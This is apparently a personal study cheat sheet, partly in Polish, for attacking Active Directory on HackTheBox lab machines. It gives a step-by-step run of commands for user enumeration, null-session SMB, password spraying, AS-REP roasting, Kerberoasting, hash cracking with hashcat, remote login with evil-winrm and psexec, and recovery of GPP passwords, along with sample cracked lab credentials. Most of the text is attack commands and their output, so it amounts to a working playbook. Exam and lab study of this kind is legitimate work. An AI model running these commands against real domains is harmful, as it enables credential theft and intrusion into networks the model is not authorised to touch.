0) nslookup
	> server 10.10.10.172#53
	> 127.0.0.1
	> 10.10.10.172
   if sqlBase use tool: 
   	dbeaver

1) ldap dla znalezienia userow:

znajdz wszystko:
┌──(kali㉿kali)-[~/Desktop/htb_oscp/ActiveDirectory/Monteverde]
└─$ ldapsearch -x -b "dc=MEGABANK,dc=LOCAL" -H ldap://10.10.10.172 
	
	ldapsearch -x -H 10.10.10.182 

if ...LegacyPwd in base64 then you have password   - decode 

znajdze person:
┌──(kali㉿kali)-[~/Desktop/htb_oscp/ActiveDirectory/Monteverde]
└─$ ldapsearch -x -b "dc=MEGABANK,dc=LOCAL" -H ldap://10.10.10.172 '(objectClass=Person)'

odczytanie userow: 
┌──(kali㉿kali)-[~/Desktop/htb_oscp/ActiveDirectory/Monteverde]
└─$ ldapsearch -x -b "dc=MEGABANK,dc=LOCAL" -H ldap://10.10.10.172 '(objectClass=Person)' sAMAccountName | grep sAMAccountName
# requesting: sAMAccountName 
sAMAccountName: Guest
sAMAccountName: MONTEVERDE$
sAMAccountName: AAD_987d7f2f57d2
sAMAccountName: mhope
sAMAccountName: SABatchJobs
sAMAccountName: svc-ata
sAMAccountName: svc-bexec
sAMAccountName: svc-netapp
sAMAccountName: dgalanos
sAMAccountName: roleary
sAMAccountName: smorgan




2) rpcclient dla znalezienia userow:

	rpcclient -U '' -N 10.10.10.161
	or:
	rpcclient -U '' 10.10.10.161

	will show:
	rpcclient $> enumdomusers     		<-- will show users, check all  commands in google

	rpcclient $> querydispinfo

	rpcclient $> queryuser [-xHexNumberNearNameLizsted]		   <-- will give info about who is user etc
	
			can give you password:
	rpcclient $> queryuser 0x457		
	        Home Drive  :
		.....
	        Description :   Account created. Password set to Welcome123!
	        .....
		
	
3) check smb if any null sesione etc:
	smbclient -U '' -N -L //10.10.10.169
	smbclient  -L //10.10.10.169
		mounting:	sudo mount -t cifs '//10.10.10.192/profiles' /mnt

4) check users using keberos if kerberos exist:
	kerbrute usename --dc 10.10.10.192 -d  blackfield -o kerbruteoutFile.out users.lst

5) use crackmapexec to check users:
	creackmapexec winrm 10.10.10.164 -u users -p 'Welcome123!'

	crackmapexec smb 10.10.10.164 -u users -p 'Welcome123!'

	check passwor plicy:
		crackmapexec smb 10.10.10.164 --pass-pol

		
-------------------------------------------------------------------------------------------------------------------------------
// Use users etc:
check if in ldap or in rpclient or in smb no passwords etc

6)  use users to get hashes:

impacket-GetNPUsers SOMe-DOMAIN-NAME.LOCAL/ -usersfile  users.txt -outputfile hashes.txt -dc-ip  10.129.10.190
impacket-GetNPUsers htb.LOCAL/ -usersfile   -dc-ip  10.10.10.161


get format at hashcat or john

	a) get users:
	python GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -usersfile users -format hashcat -outputfile hashes

	python GetNPUsers.py -dc-ip 10.10.10.161 htb.local/ -usersfile users -format john -outputfile hashesJohn

	hashcat --example-hashes         <-- check hash , which number set in hashcat
	
	b) crack hash:
	hashcat -m 18200 hashesHashCat /usr/share/wordlists/rockyou.txt 

	
	out password is s3rvice:
		$krb5asrep$23$svc-
			alfresco@HTB.LOCAL:.....154af915a887ea86b:s3rvice 
	c) password cracked:
			s3rvice 
		
	d) login witch user and password  to different services (smb/winrm/ssh):
		crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice
		or
		crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
		or (if port 5985)
		evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
		

7) can use crackmapexec to crack smb password :
	crackmapexec smb 10.10.10.161 -u userList.txt -p ./passwordList 

	
	
Extra nice tools:
	located in /usr/share/doc/python3-impacket/examples/

	/usr/share/doc/python3-impacket/examples/GetNPUsers.py

-------------------------------------------------------------------------------------------------------------------------------
// login to system 

	
8)  evil-winrm -u melanie -p 'Welcom123!' -i 10.10.10.14     <-- wait long time be patient
	

9)   psexec.py : 

/usr/share/doc/python3-impacket/examples/psexec.py htb.local/James@10.10.10.52 cmd.exe 


-------------------------------------------------------------------------------------------------------------------------------
// escalating when you have cred in active directory:


10) kerberosting:

	a) 
	use spn to get acces to account (use service principal name to log)  (it is more feature then exploit)
			spn example: MSSQLsvc/sq11@conda.local     ; MSSQLsvc - service name ; sq11 - machine ; conda.local - domain
			
	b) the purpouse is to  get hash to lacal machine and crak it 
	
	
	c) practicly: just run 		
				python GetUserSPNs.py -dc-ip 10.10.10.161 conda.local/john.smith -request
				python GetUserSPNs.py -dc-ip 10.10.10.161 conda.local/john.smith
						john.smith - is any low privilged user , but you need to have crudentials for him

	d) aftery you get hash  , use hashcat to crack it	(like point b)				
			
						
11) GPP Creadentials (Group Policy Preferences )

	a) problem is that microsoft published AES key used for encrypt password in Group Plicy Preferences (GPP)
						
	b) use tool from  powerSploit :  Get-GPPPassword.ps1   (can use it from windows but also on linux connected to domain that has connection to group plicy preferences)
						
						
12) AS-REP Roasting 
		
	a) need to have user , potential users (if will ask for password, do not have to give)	
						
	GetNPUsers.py	


